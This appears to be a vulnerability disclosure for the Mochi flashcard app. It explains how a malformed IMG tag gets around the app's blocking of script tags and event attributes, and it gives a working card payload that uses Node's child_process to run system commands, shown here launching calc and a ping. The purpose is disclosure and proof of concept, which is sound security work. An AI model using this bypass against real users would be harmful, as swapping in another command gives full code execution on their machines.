## Technical information

This XSS vector abuses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. Since Mochi cards have protection against embedding `<script>` tags & event attributes, I used this work around to bypass their markdown parsing.

Here is an example card face input, a .mochi project which executes the following can be found the in proof-of-concept folder (example_payload.mochi):
```html
<IMG id=1337 """><SCRIPT>
require('child_process').exec('calc');
require('child_process').exec('start cmd /c ping 1.1.1.1');
alert('rce poc');
</SCRIPT>"\>
```

Allowing the `child_process` module in a web application's context can pose serious security risks, as it grants the ability to execute arbitrary system commands. In this case, leading to remote code execution.
